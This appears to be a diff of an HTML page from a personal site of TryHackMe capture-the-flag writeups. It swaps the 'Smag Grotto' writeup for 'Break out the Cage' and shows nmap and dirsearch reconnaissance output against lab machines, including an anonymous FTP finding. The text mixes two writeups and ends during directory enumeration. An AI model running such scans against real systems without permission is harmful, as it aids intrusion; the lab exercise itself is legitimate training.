@@ -9,17 +9,15 @@
       
       
       
-        <link rel="prev" href="../h4cked/">
+        <link rel="prev" href="../pokemon/">
       
-      
-        <link rel="next" href="../pokemon/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.13">
     
     
       
-        <title>Smag Grotto - THM Writeups | Vasanth Vanan</title>
+        <title>Break out the Cage - THM Writeups | Vasanth Vanan</title>
       
     
     
@@ -104,7 +102,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Smag Grotto
+              Break out the Cage
             
           </span>
         </div>
@@ -471,6 +469,34 @@
               
   
   
+  
+    <li class="md-nav__item">
+      <a href="../SmagGrotto/" class="md-nav__link">
+        Smag Grotto
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pokemon/" class="md-nav__link">
+        Gotta Catch'em All!
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
     
   
   
@@ -481,12 +507,12 @@
       
       
         <label class="md-nav__link md-nav__link--active" for="__toc">
-          Smag Grotto
+          Break out the Cage
           <span class="md-nav__icon md-icon"></span>
         </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
-        Smag Grotto
+        Break out the Cage
       </a>
       
         
@@ -532,8 +558,8 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#gaining-user-access-jake" class="md-nav__link">
-    Gaining user access (Jake)
+  <a href="#gaining-user-access-cage" class="md-nav__link">
+    Gaining user access (cage)
   </a>
   
 </li>
@@ -554,34 +580,6 @@
   
 </nav>
       
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../pokemon/" class="md-nav__link">
-        Gotta Catch'em All!
-      </a>
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../breakoutthecage1/" class="md-nav__link">
-        Break out the Cage
-      </a>
     </li>
   
 
@@ -800,8 +798,8 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#gaining-user-access-jake" class="md-nav__link">
-    Gaining user access (Jake)
+  <a href="#gaining-user-access-cage" class="md-nav__link">
+    Gaining user access (cage)
   </a>
   
 </li>
@@ -836,9 +834,9 @@
   
 
 
-  <h1>Smag Grotto</h1>
+  <h1>Break out the Cage</h1>
 
-<p><a class="md-button" href="https://tryhackme.com/room/smaggrotto">TryHackMe Link</a></p>
+<p><a class="md-button" href="https://tryhackme.com/room/breakoutthecage1">TryHackMe Link</a></p>
 <div class="admonition example">
 <p class="admonition-title">Description</p>
 <p><p id="desc" style="font-size:15px"></p></p>
@@ -870,6 +868,11 @@
 <td align="center"><p id="p2" style="font-size:14px;  color: purple"></p></td>
 <td align="center"><p id="s2" style="font-size:14px; color: purple"></p></td>
 <td align="center"><p id="d2" style="font-size:14px; color: purple"></p></td>
+</tr>
+<tr>
+<td align="center"><p id="p3" style="font-size:14px;  color: purple"></p></td>
+<td align="center"><p id="s3" style="font-size:14px; color: purple"></p></td>
+<td align="center"><p id="d3" style="font-size:14px; color: purple"></p></td>
 </tr>
 </tbody>
 </table>
@@ -905,26 +908,58 @@
 <span class="normal">28</span>
 <span class="normal">29</span>
 <span class="normal">30</span>
-<span class="normal">31</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1"># Nmap 7.93 scan initiated Thu Mar  2 00:07:03 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.80.3</span>
-<span class="w">  </span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="m">10.10</span><span class="n">.</span><span class="m">80.3</span>
-<span class="w">  </span><span class="n">Host</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nf">up </span><span class="p">(</span><span class="m">0.15</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">)</span><span class="n">.</span>
-<span class="w">  </span><span class="n">Not</span><span class="w"> </span><span class="n">shown</span><span class="o">:</span><span class="w"> </span><span class="m">998</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="nf">ports </span><span class="p">(</span><span class="n">reset</span><span class="p">)</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="w">  </span><span class="c1"># Nmap 7.93 scan initiated Sat Mar  4 05:12:54 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.128.173</span>
+<span class="w">  </span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="m">10.10</span><span class="n">.</span><span class="m">128.173</span>
+<span class="w">  </span><span class="n">Host</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nf">up </span><span class="p">(</span><span class="m">0.16</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">)</span><span class="n">.</span>
+<span class="w">  </span><span class="n">Not</span><span class="w"> </span><span class="n">shown</span><span class="o">:</span><span class="w"> </span><span class="m">997</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="nf">ports </span><span class="p">(</span><span class="n">reset</span><span class="p">)</span>
 <span class="w">  </span><span class="n">PORT</span><span class="w">   </span><span class="n">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">VERSION</span>
-<span class="hll"><span class="w">  </span><span class="m">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="m">7.2</span><span class="n">p2</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="m">4</span><span class="nf">ubuntu2.8 </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="m">2.0</span><span class="p">)</span>
+<span class="hll"><span class="w">  </span><span class="m">21</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">ftp</span><span class="w">     </span><span class="n">vsftpd</span><span class="w"> </span><span class="m">3.0</span><span class="n">.</span><span class="m">3</span>
+</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">ftp</span><span class="o">-</span><span class="n">syst</span><span class="o">:</span><span class="w"> </span>
+<span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="n">STAT</span><span class="o">:</span><span class="w"> </span>
+<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">status</span><span class="o">:</span>
+<span class="w">  </span><span class="o">|</span><span class="w">      </span><span class="n">Connected</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="o">::</span><span class="n">ffff</span><span class="o">:</span><span class="m">10.17</span><span class="n">.</span><span class="m">3.217</span>
+<span class="w">  </span><span class="o">|</span><span class="w">      </span><span class="n">Logged</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">ftp</span>
+<span class="w">  </span><span class="o">|</span><span class="w">      </span><span class="n">TYPE</span><span class="o">:</span><span class="w"> </span><span class="n">ASCII</span>
+<span class="w">  </span><span class="o">|</span><span class="w">      </span><span class="n">No</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="n">bandwidth</span><span class="w"> </span><span class="n">limit</span>
+<span class="w">  </span><span class="o">|</span><span class="w">      </span><span class="n">Session</span><span class="w"> </span><span class="n">timeout</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">seconds</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="m">300</span>
+<span class="w">  </span><span class="o">|</span><span class="w">      </span><span class="n">Control</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">plain</span><span class="w"> </span><span class="n">text</span>
+<span class="w">  </span><span class="o">|</span><span class="w">      </span><span class="n">Data</span><span class="w"> </span><span class="n">connections</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">plain</span><span class="w"> </span><span class="n">text</span>
+<span class="w">  </span><span class="o">|</span><span class="w">      </span><span class="n">At</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="n">startup</span><span class="p">,</span><span class="w"> </span><span class="n">client</span><span class="w"> </span><span class="n">count</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="m">4</span>
+<span class="w">  </span><span class="o">|</span><span class="w">      </span><span class="n">vsFTPd</span><span class="w"> </span><span class="m">3.0</span><span class="n">.</span><span class="m">3</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">secure</span><span class="p">,</span><span class="w"> </span><span class="n">fast</span><span class="p">,</span><span class="w"> </span><span class="n">stable</span>
+<span class="w">  </span><span class="o">|</span>_<span class="n">End</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">status</span>
+<span class="hll"><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">ftp</span><span class="o">-</span><span class="n">anon</span><span class="o">:</span><span class="w"> </span><span class="n">Anonymous</span><span class="w"> </span><span class="n">FTP</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="nf">allowed </span><span class="p">(</span><span class="n">FTP</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="m">230</span><span class="p">)</span>
+</span><span class="w">  </span><span class="o">|</span>_<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w">    </span><span class="m">1</span><span class="w"> </span><span class="m">0</span><span class="w">        </span><span class="m">0</span><span class="w">             </span><span class="m">396</span><span class="w"> </span><span class="n">May</span><span class="w"> </span><span class="m">25</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span><span class="n">dad_tasks</span>
+<span class="hll"><span class="w">  </span><span class="m">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="m">7.6</span><span class="n">p1</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="m">4</span><span class="nf">ubuntu0.3 </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="m">2.0</span><span class="p">)</span>
 </span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="o">:</span><span class="w"> </span>
-<span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span><span class="m">74e0</span><span class="nf">e1b405856a15687e16daf2c76bee </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
-<span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span><span class="nf">bd4362b9a1865136f8c7dff90f638fa3 </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
-<span class="w">  </span><span class="o">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="nf">f9e7da078f10af970b3287c932d71b76 </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
-<span class="hll"><span class="w">  </span><span class="m">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="m">2.4</span><span class="n">.</span><span class="m">18</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
-</span><span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="m">2.4</span><span class="n">.</span><span class="m">18</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
-<span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span><span class="w"> </span><span class="n">Smag</span>
+<span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span><span class="nf">ddfd8894f8c8d11b51e37df81ddd823e </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span><span class="m">3</span><span class="nf">eba38632b8d1c6813d505ba7aaed93b </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="w">  </span><span class="o">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="nf">c0a6a364441ecf475f85f61f784c59d8 </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="hll"><span class="w">  </span><span class="m">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="n">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="m">2.4</span><span class="n">.</span><span class="m">29</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+</span><span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="m">2.4</span><span class="n">.</span><span class="m">29</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="w">  </span><span class="o">|</span>_<span class="n">http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span><span class="w"> </span><span class="n">Nicholas</span><span class="w"> </span><span class="n">Cage</span><span class="w"> </span><span class="n">Stories</span>
 <span class="w">  </span><span class="n">No</span><span class="w"> </span><span class="n">exact</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">matches</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="nf">host </span><span class="p">(</span><span class="n">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">what</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">running</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">it</span><span class="p">,</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">https</span><span class="o">://</span><span class="n">nmap.org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">)</span><span class="n">.</span>
 <span class="w">  </span><span class="n">TCP</span><span class="o">/</span><span class="n">IP</span><span class="w"> </span><span class="n">fingerprint</span><span class="o">:</span>
-<span class="w">  </span><span class="n">OS</span><span class="o">:</span><span class="nf">SCAN</span><span class="p">(</span><span class="n">V</span><span class="o">=</span><span class="m">7.93</span><span class="o">%E=4%</span><span class="n">D</span><span class="o">=</span><span class="m">3</span><span class="o">/</span><span class="m">2</span><span class="o">%OT=22%</span><span class="n">CT</span><span class="o">=</span><span class="m">1</span><span class="o">%CU=34695%</span><span class="n">PV</span><span class="o">=</span><span class="n">Y</span><span class="o">%DS=5%</span><span class="n">DC</span><span class="o">=</span><span class="n">I</span><span class="o">%G=Y%</span><span class="n">TM</span><span class="o">=</span><span class="m">64002</span><span class="n">F14</span>
-<span class="w">  </span><span class="n">OS</span><span class="o">:%P=aarch64-unknown-linux-gnu)SEQ(SP=104%</span><span class="n">GCD</span><span class="o">=</span><span class="m">1</span><span class="o">%ISR=109%</span><span class="n">TI</span><span class="o">=</span><span class="n">Z</span><span class="o">%CI=I%</span><span class="n">II</span><span class="o">=</span><span class="n">I</span><span class="o">%TS=</span>
-<span class="o">  OS:8)OPS(O1=M505ST11NW7%</span><span class="n">O2</span><span class="o">=</span><span class="n">M505ST11NW7</span><span class="o">%O3=M505NNT11NW7%</span><span class="n">O4</span><span class="o">=</span><span class="n">M505ST11NW7</span><span class="o">%O5=M5</span>
-<span class="o">  OS:05ST11NW7%</span><span class="n">O6</span><span class="o">=</span><span class="n">M505ST11</span><span class="p">)</span><span class="nf">WIN</span><span class="p">(</span><span class="n">W1</span><span class="o">=</span><span class="m">68</span><span class="n">DF</span><span class="o">%W2=68DF%</span><span class="n">W3</span><span class="o">=</span><span class="m">68</span><span class="n">DF</span><span class="o">%W4=68DF%</span><span class="n">W5</span><span class="o">=</span><span class="m">68</span><span class="n">DF</span><span class="o">%W6=68D</span>
-<span class="o">  OS:F)ECN(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="m">6903</span><span class="o">%O=M505NNSNW7%</span><span class="n">CC</span><span class="o">=</span><span class="n">Y</span><span class="o">%Q=)T1(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">S</span><span class="o">=</span><span class="n">O</span><span class="o">%A=S</span>
+<span class="w">  </span><span class="n">OS</span><span class="o">:</span><span class="nf">SCAN</span><span class="p">(</span><span class="n">V</span><span class="o">=</span><span class="m">7.93</span><span class="o">%E=4%</span><span class="n">D</span><span class="o">=</span><span class="m">3</span><span class="o">/</span><span class="m">4</span><span class="o">%OT=21%</span><span class="n">CT</span><span class="o">=</span><span class="m">1</span><span class="o">%CU=34511%</span><span class="n">PV</span><span class="o">=</span><span class="n">Y</span><span class="o">%DS=5%</span><span class="n">DC</span><span class="o">=</span><span class="n">I</span><span class="o">%G=Y%</span><span class="n">TM</span><span class="o">=</span><span class="m">64031</span><span class="n">A04</span>
+<span class="w">  </span><span class="n">OS</span><span class="o">:%P=aarch64-unknown-linux-gnu)SEQ(SP=106%</span><span class="n">GCD</span><span class="o">=</span><span class="m">1</span><span class="o">%ISR=109%</span><span class="n">TI</span><span class="o">=</span><span class="n">Z</span><span class="o">%CI=Z%</span><span class="n">II</span><span class="o">=</span><span class="n">I</span><span class="o">%TS=</span>
+<span class="o">  OS:A)OPS(O1=M505ST11NW7%</span><span class="n">O2</span><span class="o">=</span><span class="n">M505ST11NW7</span><span class="o">%O3=M505NNT11NW7%</span><span class="n">O4</span><span class="o">=</span><span class="n">M505ST11NW7</span><span class="o">%O5=M5</span>
+<span class="o">  OS:05ST11NW7%</span><span class="n">O6</span><span class="o">=</span><span class="n">M505ST11</span><span class="p">)</span><span class="nf">WIN</span><span class="p">(</span><span class="n">W1</span><span class="o">=</span><span class="n">F4B3</span><span class="o">%W2=F4B3%</span><span class="n">W3</span><span class="o">=</span><span class="n">F4B3</span><span class="o">%W4=F4B3%</span><span class="n">W5</span><span class="o">=</span><span class="n">F4B3</span><span class="o">%W6=F4B</span>
+<span class="o">  OS:3)ECN(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="n">F507</span><span class="o">%O=M505NNSNW7%</span><span class="n">CC</span><span class="o">=</span><span class="n">Y</span><span class="o">%Q=)T1(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">S</span><span class="o">=</span><span class="n">O</span><span class="o">%A=S</span>
 <span class="o">  OS:+%</span><span class="bp">F</span><span class="o">=</span><span class="n">AS</span><span class="o">%RD=0%</span><span class="n">Q</span><span class="o">=</span><span class="p">)</span><span class="nf">T2</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">N</span><span class="p">)</span><span class="nf">T3</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">N</span><span class="p">)</span><span class="nf">T4</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%DF=Y%</span><span class="bp">T</span><span class="o">=</span><span class="m">40</span><span class="o">%W=0%</span><span class="n">S</span><span class="o">=</span><span class="n">A</span><span class="o">%A=Z%</span><span class="bp">F</span><span class="o">=</span><span class="n">R</span><span class="o">%O=%</span><span class="n">RD</span><span class="o">=</span><span class="m">0</span><span class="o">%Q=</span>
 <span class="o">  OS:)T5(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="m">0</span><span class="o">%S=Z%</span><span class="n">A</span><span class="o">=</span><span class="n">S</span><span class="o">+%F=AR%</span><span class="n">O</span><span class="o">=%RD=0%</span><span class="n">Q</span><span class="o">=</span><span class="p">)</span><span class="nf">T6</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%DF=Y%</span><span class="bp">T</span><span class="o">=</span><span class="m">40</span><span class="o">%W=0%</span><span class="n">S</span><span class="o">=</span><span class="n">A</span><span class="o">%</span>
 <span class="o">  OS:A=Z%</span><span class="bp">F</span><span class="o">=</span><span class="n">R</span><span class="o">%O=%</span><span class="n">RD</span><span class="o">=</span><span class="m">0</span><span class="o">%Q=)T7(R=Y%</span><span class="n">DF</span><span class="o">=</span><span class="n">Y</span><span class="o">%T=40%</span><span class="n">W</span><span class="o">=</span><span class="m">0</span><span class="o">%S=Z%</span><span class="n">A</span><span class="o">=</span><span class="n">S</span><span class="o">+%F=AR%</span><span class="n">O</span><span class="o">=%RD=0%</span><span class="n">Q</span><span class="o">=</span><span class="p">)</span><span class="nf">U1</span><span class="p">(</span><span class="n">R</span><span class="o">=</span><span class="n">Y</span><span class="o">%</span>
@@ -932,147 +967,107 @@
 <span class="o">  OS:40%</span><span class="n">CD</span><span class="o">=</span><span class="n">S</span><span class="p">)</span>
 
 <span class="w">  </span><span class="n">Network</span><span class="w"> </span><span class="n">Distance</span><span class="o">:</span><span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="n">hops</span>
-<span class="w">  </span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="o">:</span><span class="w"> </span><span class="n">OS</span><span class="o">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="o">:</span><span class="w"> </span><span class="n">cpe</span><span class="o">:/</span><span class="n">o</span><span class="o">:</span><span class="n">linux</span><span class="o">:</span><span class="n">linux_kernel</span>
+<span class="w">  </span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="o">:</span><span class="w"> </span><span class="n">OSs</span><span class="o">:</span><span class="w"> </span><span class="n">Unix</span><span class="p">,</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="o">:</span><span class="w"> </span><span class="n">cpe</span><span class="o">:/</span><span class="n">o</span><span class="o">:</span><span class="n">linux</span><span class="o">:</span><span class="n">linux_kernel</span>
 
 <span class="w">  </span><span class="n">OS</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">https</span><span class="o">://</span><span class="n">nmap.org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="n">.</span>
-<span class="w">  </span><span class="c1"># Nmap done at Thu Mar  2 00:07:32 2023 -- 1 IP address (1 host up) scanned in 29.21 seconds</span>
+<span class="w">  </span><span class="c1"># Nmap done at Sat Mar  4 05:14:28 2023 -- 1 IP address (1 host up) scanned in 94.48 seconds</span>
 </code></pre></div></td></tr></table></div></li>
 </ul>
 <h2 id="enumeration"><b>Enumeration</b><a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
-<p>During my assessment, I visited the http service at port 80, which did not surprise me. Later, I attempted to enumerate the hidden directories using <strong><code>dirsearch</code></strong> and I found the <strong>/mail</strong> folder. </p>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
-<span class="normal"> 2</span>
-<span class="normal"> 3</span>
-<span class="normal"> 4</span>
-<span class="normal"> 5</span>
-<span class="normal"> 6</span>
-<span class="normal"> 7</span>
-<span class="normal"> 8</span>
-<span class="normal"> 9</span>
-<span class="normal">10</span>
-<span class="normal">11</span>
-<span class="normal">12</span>
-<span class="normal">13</span>
-<span class="normal">14</span>
-<span class="normal">15</span>
-<span class="normal">16</span>
-<span class="normal">17</span>
-<span class="normal">18</span>
-<span class="normal">19</span>
-<span class="normal">20</span>
-<span class="normal">21</span>
-<span class="normal">22</span>
-<span class="normal">23</span>
-<span class="normal">24</span>
-<span class="normal">25</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">44</span><span class="p">]</span><span class="w"> </span><span class="n">Starting</span><span class="o">:</span><span class="w"> </span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.ht_wsr.txt</span><span class="w">                                     </span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess.bak1</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess.orig</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess.sample</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess.save</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess_extra</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess_sc</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccessBAK</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccess_orig</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccessOLD</span>
-<span class="p">[</span><span class="m">00</span><span class="o">:</span><span class="m">08</span><span class="o">:</span><span class="m">51</span><span class="p">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="o">-</span><span class="w">  </span><span class="m">275</span><span class="n">B</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="o">/</span><span class="n">.htaccessOLD2</span>
